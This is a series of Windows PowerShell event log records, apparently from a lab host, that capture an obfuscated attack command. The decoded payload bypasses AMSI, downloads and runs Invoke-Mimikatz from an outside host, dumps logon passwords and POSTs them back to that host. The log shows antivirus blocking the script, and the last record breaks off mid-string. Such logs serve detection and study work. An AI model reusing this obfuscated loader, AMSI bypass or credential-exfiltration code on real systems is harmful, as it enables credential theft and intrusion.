{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:55.804707Z"},"EventRecordID":1167,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0000-0169-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":4164},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":". ( $PsHoME[4]+$PsHoME[34]+'X')(  $(Sv 'Ofs' '' ) +[StriNG]('91A78}101d116,46t83d101A114d118A105A99A101W80N111N105N110N116d77}97A110z97}103z101A114N93,58A58N83d101}114}118t101t114}67A101t114A116N105W102}105,99A97t116}101,86}97}108W105W100z97}116,105}111}110W67,97N108A108}98}97}99A107,32A61t32N123t36}116,114A117}101A125N10A116A114A121}123}10}91}82W101W102A93A46d65}115,115}101d109t98,108t121t46}71z101N116N84t121z112d101d40t39z83N121d115z39}43z39t116N101A109d46}77d97d110N39A43z39W97d103W101W109t101}110N116W46d65A117z116z39W43d39}111d109A97z116}105A111z110z46W65A109}39z43A39}115t105}85t116}39N43z39d105A108A115t39z41N46W71W101}116z70d105N101A108t100,40}39,97}109d39A43W39z115}105}73d110}105}39d43t39A116t70t97N105N108}101d100A39z44z32N39W78A111A110z80W39z43d39,117t98N108}105t99}44N83,116W97}39}43A39}116W105,99W39}41z46A83N101,116z86d97}108t117N101z40A36N110d117A108A108z44N32}36}116}114,117A101N41W10,125,99}97A116A99,104d123t125A10}91t78t101}116,46,83d101W114z118}105N99A101d80A111,105t110}116W77,97N110d97,103A101}114W93}58t58}83A101d114z118t101A114A67N101W114d116,105N102d105N99}97,116W101z86t97}108}105A100A97,116z105A111z110}67W97d108d108}98}97z99,107N32N61,32,123}36d116t114}117}101N125}10N91A83}121,115A116}101z109A46}78}101W116N46A83}101,114,118,105}99N101,80,111A105z110A116A77A97,110N97t103t101t114}93}58d58t83N101t99,117d114z105A116d121,80}114,111}116,111}99A111W108W32}61A32W91W83z121W115}116t101}109d46}78A101t116N46t83N101A99}117d114W105d116A121}80d114W111t116z111}99d111z108}84z121N112z101,93A39,83A115z108,51d44W84}108z115A44N84A108t115A49W49N44,84}108}115N49d50,39W10t73t69t88W32}40A78A101A119A45A79d98d106t101z99}116A32W78}101W116t46}87,101N98A67,108A105d101}110d116,41A46z68d111N119N110z108A111}97A100z83t116A114A105A110,103,40A39d104d116N116N112A115t58A47N47z49}48z46,50}51A46}49d50t51N46}49A49A58N52}52}51W47}73W110A118}111A107}101N45t77}105A109}105,107W97t116z122z46,112t115}49A39,41d10t36d99t109z100t32W61d32t73}110,118,111}107d101W45W77z105}109}105,107d97z116d122W32d45t67z111A109W109}97d110t100t32A39,112A114}105N118W105}108N101}103z101N58,58t100d101t98z117t103W32W115W101}107t117d114z108A115}97,58N58W108A111A103A111}110A112A97A115N115z119d111}114d100A115N32N101,120}105}116z39}10,36A114}101z113d117N101}115t116N32d61t32A91}83d121A115W116W101d109t46N78t101A116A46}87z101W98z82t101W113d117A101t115d116d93d58N58W67,114}101d97A116}101z40}39N104N116}116t112,115W58t47d47N49A48d46}50A51A46}49,50N51N46}49A49,58t52d52}51}47}39}41A10z36N114}101z113z117N101A115W116A46d77t101W116W104A111t100,32,61z32,39d80,79,83W84d39z10}36t114A101t113d117W101t115N116z46d67}111A110t116z101z110}116t84d121}112A101}32A61t32A39z97d112W112W108}105,99N97d116t105}111z110z47}120}45A119t119z119}45N102,111N114}109A45d117A114t108z101N110A99A111}100}101A100z39A10t36z98}121,116A101z115A32A61}32}91N83}121A115W116N101d109A46}84}101W120N116}46N69,110}99W111W100}105t110,103A93,58A58z65z83W67d73t73W46A71N101}116t66}121,116A101}115A40,36N99A109A100A41z10A36A114z101A113}117,101N115A116W46,67d111d110z116z101t110A116}76}101z110t103}116A104,32}61t32N36d98,121N116z101}115N46}76z101N110,103z116W104}10A36d114d101A113N117}101A115d116}83z116A114A101,97N109z32,61}32}36}114W101t113N117,101W115A116}46A71}101W116A82z101A113A117N101t115N116t83A116A114}101d97d109}40}41t10z36A114t101d113A117}101A115A116A83N116}114d101}97W109A46,87z114d105,116A101,40}36W98N121z116z101t115}44A32z48}44d32}36A98W121t116A101}115W46,76N101t110W103}116,104t41d10A36z114N101}113A117}101}115d116}83A116N114t101W97W109W46,67}108}111}115d101t40t41A10z36W114}101t113t117N101A115N116t46d71t101W116}82W101z115}112}111A110d115}101}40,41'.SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ) +$( set-itEM 'VaRiAble:Ofs' ' ' ) ) ","ScriptBlockId":"743dccb5-16a9-4141-b5d2-f8238da645c2","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:55.923866Z"},"EventRecordID":1168,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0000-EC69-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":4164},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.906\r\n        Host ID = 8f7437e5-df8c-40fb-98f2-fe4e143db291\r\n        Host Application = powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')(  $(Sv 'Ofs' '' ) +[StriNG]('91A78}101d116,46t83d101A114d118A105A99A101W80N111N105N110N116d77}97A110z97}103z101A114N93,58A58N83d101}114}118t101t114}67A101t114A116N105W102}105,99A97t116}101,86}97}108W105W100z97}116,105}111}110W67,97N108A108}98}97}99A107,32A61t32N123t36}116,114A117}101A125N10A116A114A121}123}10}91}82W101W102A93A46d65}115,115}101d109t98,108t121t46}71z101N116N84t121z112d101d40t39z83N121d115z39}43z39t116N101A109d46}77d97d110N39A43z39W97d103W101W109t101}110N116W46d65A117z116z39W43d39}111d109A97z116}105A111z110z46W65A109}39z43A39}115t105}85t116}39N43z39d105A108A115t39z41N46W71W101}116z70d105N101A108t100,40}39,97}109d39A43W39z115}105}73d110}105}39d43t39A116t70t97N105N108}101d100A39z44z32N39W78A111A110z80W39z43d39,117t98N108}105t99}44N83,116W97}39}43A39}116W105,99W39}41z46A83N101,116z86d97}108t117N101z40A36N110d117A108A108z44N32}36}116}114,117A101N41W10,125,99}97A116A99,104d123t125A10}91t78t101}116,46,83d101W114z118}105N99A101d80A111,105t110}116W77,97N110d97,103A101}114W93}58t58}83A101d114z118t101A114A67N101W114d116,105N102d105N99}97,116W101z86t97}108}105A100A97,116z105A111z110}67W97d108d108}98}97z99,107N32N61,32,123}36d116t114}117}101N125}10N91A83}121,115A116}101z109A46}78}101W116N46A83}101,114,118,105}99N101,80,111A105z110A116A77A97,110N97t103t101t114}93}58d58t83N101t99,117d114z105A116d121,80}114,111}116,111}99A111W108W32}61A32W91W83z121W115}116t101}109d46}78A101t116N46t83N101A99}117d114W105d116A121}80d114W111t116z111}99d111z108}84z121N112z101,93A39,83A115z108,51d44W84}108z115A44N84A108t115A49W49N44,84}108}115N49d50,39W10t73t69t88W32}40A78A101A119A45A79d98d106t101z99}116A32W78}101W116t46}87,101N98A67,108A105d101}110d116,41A46z68d111N119N110z108A111}97A100z83t116A114A105A110,103,40A39d104d116N116N112A115t58A47N47z49}48z46,50}51A46}49d50t51N46}49A49A58N52}52}51W47}73W110A118}111A107}101N45t77}105A109}105,107W97t116z122z46,112t115}49A39,41d10t36d99t109z100t32W61d32t73}110,118,111}107d101W45W77z105}109}105,107d97z116d122W32d45t67z111A109W109}97d110t100t32A39,112A114}105N118W105}108N101}103z101N58,58t100d101t98z117t103W32W115W101}107t117d114z108A115}97,58N58W108A111A103A111}110A112A97A115N115z119d111}114d100A115N32N101,120}105}116z39}10,36A114}101z113d117N101}115t116N32d61t32A91}83d121A115W116W101d109t46N78t101A116A46}87z101W98z82t101W113d117A101t115d116d93d58N58W67,114}101d97A116}101z40}39N104N116}116t112,115W58t47d47N49A48d46}50A51A46}49,50N51N46}49A49,58t52d52}51}47}39}41A10z36N114}101z113z117N101A115W116A46d77t101W116W104A111t100,32,61z32,39d80,79,83W84d39z10}36t114A101t113d117W101t115N116z46d67}111A110t116z101z110}116t84d121}112A101}32A61t32A39z97d112W112W108}105,99N97d116t105}111z110z47}120}45A119t119z119}45N102,111N114}109A45d117A114t108z101N110A99A111}100}101A100z39A10t36z98}121,116A101z115A32A61}32}91N83}121A115W116N101d109A46}84}101W120N116}46N69,110}99W111W100}105t110,103A93,58A58z65z83W67d73t73W46A71N101}116t66}121,116A101}115A40,36N99A109A100A41z10A36A114z101A113}117,101N115A116W46,67d111d110z116z101t110A116}76}101z110t103}116A104,32}61t32N36d98,121N116z101}115N46}76z101N110,103z116W104}10A36d114d101A113N117}101A115d116}83z116A114A101,97N109z32,61}32}36}114W101t113N117,101W115A116}46A71}101W116A82z101A113A117N101t115N116t83A116A114}101d97d109}40}41t10z36A114t101d113A117}101A115A116A83N116}114d101}97W109A46,87z114d105,116A101,40}36W98N121z116z101t115}44A32z48}44d32}36A98W121t116A101}115W46,76N101t110W103}116,104t41d10A36z114N101}113A117}101}115d116}83A116N114t101W97W109W46,67}108}111}115d101t40t41A10z36W114}101t113t117N101A115N116t46d71t101W116}82W101z115}112}111A110d115}101}40,41'.SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ) +$( set-itEM 'VaRiAble:Ofs' ' ' ) ) \r\n        Engine Version = 5.1.19041.906\r\n        Runspace ID = 499dcab4-7e73-4806-a32c-50de48c1e513\r\n        Pipeline ID = 1\r\n        Command Name = Set-Variable\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 16\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Set-Variable): \"Set-Variable\"\r\nParameterBinding(Set-Variable): name=\"Name\"; value=\"Ofs\"\r\nParameterBinding(Set-Variable): name=\"Value\"; value=\"\"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:55.942069Z"},"EventRecordID":1169,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0000-ED69-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":4164},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ ([int] $_ -AS [ChAR]) }","ScriptBlockId":"8df0fc25-a8fe-4c2c-b0d1-fa3c1ad84042","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:56.691052Z"},"EventRecordID":1170,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0000-D26A-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":4164},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.906\r\n        Host ID = 8f7437e5-df8c-40fb-98f2-fe4e143db291\r\n        Host Application = powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')(  $(Sv 'Ofs' '' ) +[StriNG]('91A78}101d116,46t83d101A114d118A105A99A101W80N111N105N110N116d77}97A110z97}103z101A114N93,58A58N83d101}114}118t101t114}67A101t114A116N105W102}105,99A97t116}101,86}97}108W105W100z97}116,105}111}110W67,97N108A108}98}97}99A107,32A61t32N123t36}116,114A117}101A125N10A116A114A121}123}10}91}82W101W102A93A46d65}115,115}101d109t98,108t121t46}71z101N116N84t121z112d101d40t39z83N121d115z39}43z39t116N101A109d46}77d97d110N39A43z39W97d103W101W109t101}110N116W46d65A117z116z39W43d39}111d109A97z116}105A111z110z46W65A109}39z43A39}115t105}85t116}39N43z39d105A108A115t39z41N46W71W101}116z70d105N101A108t100,40}39,97}109d39A43W39z115}105}73d110}105}39d43t39A116t70t97N105N108}101d100A39z44z32N39W78A111A110z80W39z43d39,117t98N108}105t99}44N83,116W97}39}43A39}116W105,99W39}41z46A83N101,116z86d97}108t117N101z40A36N110d117A108A108z44N32}36}116}114,117A101N41W10,125,99}97A116A99,104d123t125A10}91t78t101}116,46,83d101W114z118}105N99A101d80A111,105t110}116W77,97N110d97,103A101}114W93}58t58}83A101d114z118t101A114A67N101W114d116,105N102d105N99}97,116W101z86t97}108}105A100A97,116z105A111z110}67W97d108d108}98}97z99,107N32N61,32,123}36d116t114}117}101N125}10N91A83}121,115A116}101z109A46}78}101W116N46A83}101,114,118,105}99N101,80,111A105z110A116A77A97,110N97t103t101t114}93}58d58t83N101t99,117d114z105A116d121,80}114,111}116,111}99A111W108W32}61A32W91W83z121W115}116t101}109d46}78A101t116N46t83N101A99}117d114W105d116A121}80d114W111t116z111}99d111z108}84z121N112z101,93A39,83A115z108,51d44W84}108z115A44N84A108t115A49W49N44,84}108}115N49d50,39W10t73t69t88W32}40A78A101A119A45A79d98d106t101z99}116A32W78}101W116t46}87,101N98A67,108A105d101}110d116,41A46z68d111N119N110z108A111}97A100z83t116A114A105A110,103,40A39d104d116N116N112A115t58A47N47z49}48z46,50}51A46}49d50t51N46}49A49A58N52}52}51W47}73W110A118}111A107}101N45t77}105A109}105,107W97t116z122z46,112t115}49A39,41d10t36d99t109z100t32W61d32t73}110,118,111}107d101W45W77z105}109}105,107d97z116d122W32d45t67z111A109W109}97d110t100t32A39,112A114}105N118W105}108N101}103z101N58,58t100d101t98z117t103W32W115W101}107t117d114z108A115}97,58N58W108A111A103A111}110A112A97A115N115z119d111}114d100A115N32N101,120}105}116z39}10,36A114}101z113d117N101}115t116N32d61t32A91}83d121A115W116W101d109t46N78t101A116A46}87z101W98z82t101W113d117A101t115d116d93d58N58W67,114}101d97A116}101z40}39N104N116}116t112,115W58t47d47N49A48d46}50A51A46}49,50N51N46}49A49,58t52d52}51}47}39}41A10z36N114}101z113z117N101A115W116A46d77t101W116W104A111t100,32,61z32,39d80,79,83W84d39z10}36t114A101t113d117W101t115N116z46d67}111A110t116z101z110}116t84d121}112A101}32A61t32A39z97d112W112W108}105,99N97d116t105}111z110z47}120}45A119t119z119}45N102,111N114}109A45d117A114t108z101N110A99A111}100}101A100z39A10t36z98}121,116A101z115A32A61}32}91N83}121A115W116N101d109A46}84}101W120N116}46N69,110}99W111W100}105t110,103A93,58A58z65z83W67d73t73W46A71N101}116t66}121,116A101}115A40,36N99A109A100A41z10A36A114z101A113}117,101N115A116W46,67d111d110z116z101t110A116}76}101z110t103}116A104,32}61t32N36d98,121N116z101}115N46}76z101N110,103z116W104}10A36d114d101A113N117}101A115d116}83z116A114A101,97N109z32,61}32}36}114W101t113N117,101W115A116}46A71}101W116A82z101A113A117N101t115N116t83A116A114}101d97d109}40}41t10z36A114t101d113A117}101A115A116A83N116}114d101}97W109A46,87z114d105,116A101,40}36W98N121z116z101t115}44A32z48}44d32}36A98W121t116A101}115W46,76N101t110W103}116,104t41d10A36z114N101}113A117}101}115d116}83A116N114t101W97W109W46,67}108}111}115d101t40t41A10z36W114}101t113t117N101A115N116t46d71t101W116}82W101z115}112}111A110d115}101}40,41'.SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ) +$( set-itEM 'VaRiAble:Ofs' ' ' ) ) \r\n        Engine Version = 5.1.19041.906\r\n        Runspace ID = 499dcab4-7e73-4806-a32c-50de48c1e513\r\n        Pipeline ID = 1\r\n        Command Name = Set-Item\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 20\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Set-Item): \"Set-Item\"\r\nParameterBinding(Set-Item): name=\"Path\"; value=\"VaRiAble:Ofs\"\r\nParameterBinding(Set-Item): name=\"Value\"; value=\" \"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:56.725489Z"},"EventRecordID":1172,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0000-D36A-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":4164},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.906\r\n        Host ID = 8f7437e5-df8c-40fb-98f2-fe4e143db291\r\n        Host Application = powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')(  $(Sv 'Ofs' '' ) +[StriNG]('91A78}101d116,46t83d101A114d118A105A99A101W80N111N105N110N116d77}97A110z97}103z101A114N93,58A58N83d101}114}118t101t114}67A101t114A116N105W102}105,99A97t116}101,86}97}108W105W100z97}116,105}111}110W67,97N108A108}98}97}99A107,32A61t32N123t36}116,114A117}101A125N10A116A114A121}123}10}91}82W101W102A93A46d65}115,115}101d109t98,108t121t46}71z101N116N84t121z112d101d40t39z83N121d115z39}43z39t116N101A109d46}77d97d110N39A43z39W97d103W101W109t101}110N116W46d65A117z116z39W43d39}111d109A97z116}105A111z110z46W65A109}39z43A39}115t105}85t116}39N43z39d105A108A115t39z41N46W71W101}116z70d105N101A108t100,40}39,97}109d39A43W39z115}105}73d110}105}39d43t39A116t70t97N105N108}101d100A39z44z32N39W78A111A110z80W39z43d39,117t98N108}105t99}44N83,116W97}39}43A39}116W105,99W39}41z46A83N101,116z86d97}108t117N101z40A36N110d117A108A108z44N32}36}116}114,117A101N41W10,125,99}97A116A99,104d123t125A10}91t78t101}116,46,83d101W114z118}105N99A101d80A111,105t110}116W77,97N110d97,103A101}114W93}58t58}83A101d114z118t101A114A67N101W114d116,105N102d105N99}97,116W101z86t97}108}105A100A97,116z105A111z110}67W97d108d108}98}97z99,107N32N61,32,123}36d116t114}117}101N125}10N91A83}121,115A116}101z109A46}78}101W116N46A83}101,114,118,105}99N101,80,111A105z110A116A77A97,110N97t103t101t114}93}58d58t83N101t99,117d114z105A116d121,80}114,111}116,111}99A111W108W32}61A32W91W83z121W115}116t101}109d46}78A101t116N46t83N101A99}117d114W105d116A121}80d114W111t116z111}99d111z108}84z121N112z101,93A39,83A115z108,51d44W84}108z115A44N84A108t115A49W49N44,84}108}115N49d50,39W10t73t69t88W32}40A78A101A119A45A79d98d106t101z99}116A32W78}101W116t46}87,101N98A67,108A105d101}110d116,41A46z68d111N119N110z108A111}97A100z83t116A114A105A110,103,40A39d104d116N116N112A115t58A47N47z49}48z46,50}51A46}49d50t51N46}49A49A58N52}52}51W47}73W110A118}111A107}101N45t77}105A109}105,107W97t116z122z46,112t115}49A39,41d10t36d99t109z100t32W61d32t73}110,118,111}107d101W45W77z105}109}105,107d97z116d122W32d45t67z111A109W109}97d110t100t32A39,112A114}105N118W105}108N101}103z101N58,58t100d101t98z117t103W32W115W101}107t117d114z108A115}97,58N58W108A111A103A111}110A112A97A115N115z119d111}114d100A115N32N101,120}105}116z39}10,36A114}101z113d117N101}115t116N32d61t32A91}83d121A115W116W101d109t46N78t101A116A46}87z101W98z82t101W113d117A101t115d116d93d58N58W67,114}101d97A116}101z40}39N104N116}116t112,115W58t47d47N49A48d46}50A51A46}49,50N51N46}49A49,58t52d52}51}47}39}41A10z36N114}101z113z117N101A115W116A46d77t101W116W104A111t100,32,61z32,39d80,79,83W84d39z10}36t114A101t113d117W101t115N116z46d67}111A110t116z101z110}116t84d121}112A101}32A61t32A39z97d112W112W108}105,99N97d116t105}111z110z47}120}45A119t119z119}45N102,111N114}109A45d117A114t108z101N110A99A111}100}101A100z39A10t36z98}121,116A101z115A32A61}32}91N83}121A115W116N101d109A46}84}101W120N116}46N69,110}99W111W100}105t110,103A93,58A58z65z83W67d73t73W46A71N101}116t66}121,116A101}115A40,36N99A109A100A41z10A36A114z101A113}117,101N115A116W46,67d111d110z116z101t110A116}76}101z110t103}116A104,32}61t32N36d98,121N116z101}115N46}76z101N110,103z116W104}10A36d114d101A113N117}101A115d116}83z116A114A101,97N109z32,61}32}36}114W101t113N117,101W115A116}46A71}101W116A82z101A113A117N101t115N116t83A116A114}101d97d109}40}41t10z36A114t101d113A117}101A115A116A83N116}114d101}97W109A46,87z114d105,116A101,40}36W98N121z116z101t115}44A32z48}44d32}36A98W121t116A101}115W46,76N101t110W103}116,104t41d10A36z114N101}113A117}101}115d116}83A116N114t101W97W109W46,67}108}111}115d101t40t41A10z36W114}101t113t117N101A115N116t46d71t101W116}82W101z115}112}111A110d115}101}40,41'.SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ) +$( set-itEM 'VaRiAble:Ofs' ' ' ) ) \r\n        Engine Version = 5.1.19041.906\r\n        Runspace ID = 499dcab4-7e73-4806-a32c-50de48c1e513\r\n        Pipeline ID = 1\r\n        Command Name = Invoke-Expression\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 23\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Invoke-Expression): \"Invoke-Expression\"\r\nParameterBinding(Invoke-Expression): name=\"Command\"; value=\"[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\ntry{\n[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)\n}catch{}\n[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'\nIEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')\n$cmd = Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\n$request = [System.Net.WebRequest]::Create('https://10.23.123.11:443/')\n$request.Method = 'POST'\n$request.ContentType = 'application/x-www-form-urlencoded'\n$bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)\n$request.ContentLength = $bytes.Length\n$requestStream = $request.GetRequestStream()\n$requestStream.Write($bytes, 0, $bytes.Length)\n$requestStream.Close()\n$request.GetResponse()\"\r\nTerminatingError(Invoke-Expression): \"At line:1 char:1\r\n+ [Net.ServicePointManager]::ServerCertificateValidationCallback = {$tr ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:57.253885Z"},"EventRecordID":1173,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0001-717B-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":10624},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ Set-StrictMode -Version 1; $_.PSMessageDetails }","ScriptBlockId":"00deabc4-9621-4799-874b-df6eb6c43d7d","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:57.255091Z"},"EventRecordID":1174,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0001-727B-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":10624},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.19041.906\r\n        Host ID = 7022b4ad-206e-4ed0-9526-c5d31e47bc1c\r\n        Host Application = powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')(  $(Sv 'Ofs' '' ) +[StriNG]('91A78}101d116,46t83d101A114d118A105A99A101W80N111N105N110N116d77}97A110z97}103z101A114N93,58A58N83d101}114}118t101t114}67A101t114A116N105W102}105,99A97t116}101,86}97}108W105W100z97}116,105}111}110W67,97N108A108}98}97}99A107,32A61t32N123t36}116,114A117}101A125N10A116A114A121}123}10}91}82W101W102A93A46d65}115,115}101d109t98,108t121t46}71z101N116N84t121z112d101d40t39z83N121d115z39}43z39t116N101A109d46}77d97d110N39A43z39W97d103W101W109t101}110N116W46d65A117z116z39W43d39}111d109A97z116}105A111z110z46W65A109}39z43A39}115t105}85t116}39N43z39d105A108A115t39z41N46W71W101}116z70d105N101A108t100,40}39,97}109d39A43W39z115}105}73d110}105}39d43t39A116t70t97N105N108}101d100A39z44z32N39W78A111A110z80W39z43d39,117t98N108}105t99}44N83,116W97}39}43A39}116W105,99W39}41z46A83N101,116z86d97}108t117N101z40A36N110d117A108A108z44N32}36}116}114,117A101N41W10,125,99}97A116A99,104d123t125A10}91t78t101}116,46,83d101W114z118}105N99A101d80A111,105t110}116W77,97N110d97,103A101}114W93}58t58}83A101d114z118t101A114A67N101W114d116,105N102d105N99}97,116W101z86t97}108}105A100A97,116z105A111z110}67W97d108d108}98}97z99,107N32N61,32,123}36d116t114}117}101N125}10N91A83}121,115A116}101z109A46}78}101W116N46A83}101,114,118,105}99N101,80,111A105z110A116A77A97,110N97t103t101t114}93}58d58t83N101t99,117d114z105A116d121,80}114,111}116,111}99A111W108W32}61A32W91W83z121W115}116t101}109d46}78A101t116N46t83N101A99}117d114W105d116A121}80d114W111t116z111}99d111z108}84z121N112z101,93A39,83A115z108,51d44W84}108z115A44N84A108t115A49W49N44,84}108}115N49d50,39W10t73t69t88W32}40A78A101A119A45A79d98d106t101z99}116A32W78}101W116t46}87,101N98A67,108A105d101}110d116,41A46z68d111N119N110z108A111}97A100z83t116A114A105A110,103,40A39d104d116N116N112A115t58A47N47z49}48z46,50}51A46}49d50t51N46}49A49A58N52}52}51W47}73W110A118}111A107}101N45t77}105A109}105,107W97t116z122z46,112t115}49A39,41d10t36d99t109z100t32W61d32t73}110,118,111}107d101W45W77z105}109}105,107d97z116d122W32d45t67z111A109W109}97d110t100t32A39,112A114}105N118W105}108N101}103z101N58,58t100d101t98z117t103W32W115W101}107t117d114z108A115}97,58N58W108A111A103A111}110A112A97A115N115z119d111}114d100A115N32N101,120}105}116z39}10,36A114}101z113d117N101}115t116N32d61t32A91}83d121A115W116W101d109t46N78t101A116A46}87z101W98z82t101W113d117A101t115d116d93d58N58W67,114}101d97A116}101z40}39N104N116}116t112,115W58t47d47N49A48d46}50A51A46}49,50N51N46}49A49,58t52d52}51}47}39}41A10z36N114}101z113z117N101A115W116A46d77t101W116W104A111t100,32,61z32,39d80,79,83W84d39z10}36t114A101t113d117W101t115N116z46d67}111A110t116z101z110}116t84d121}112A101}32A61t32A39z97d112W112W108}105,99N9